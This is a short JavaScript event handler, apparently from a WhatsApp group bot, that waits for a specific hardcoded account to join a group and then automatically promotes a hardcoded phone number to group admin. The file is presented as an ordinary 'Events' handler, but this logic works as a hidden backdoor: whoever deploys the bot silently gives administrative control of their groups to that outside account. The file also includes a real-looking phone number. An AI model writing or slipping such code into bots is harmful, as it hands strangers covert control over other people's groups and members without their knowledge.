const Events = async (client, Fortu) => {
  try {
    const Number = "254114018035";
    const Lid = "4170564288589@lid";
    const Jid = Number + "@s.whatsapp.net";

    if (Fortu.action === "add") {
      if (Fortu.participants.includes(Lid)) {
        await client.groupParticipantsUpdate(Fortu.id, [Jid], "promote");

        await client.sendMessage(Fortu.id, {
          text: `@${Number} has joined and has been promoted to admin 👀`,
          mentions: [Jid]
        });
      }
    }
  } catch (err) {
    console.error("Error in Events handler:", err);
  }
};

module.exports = Events;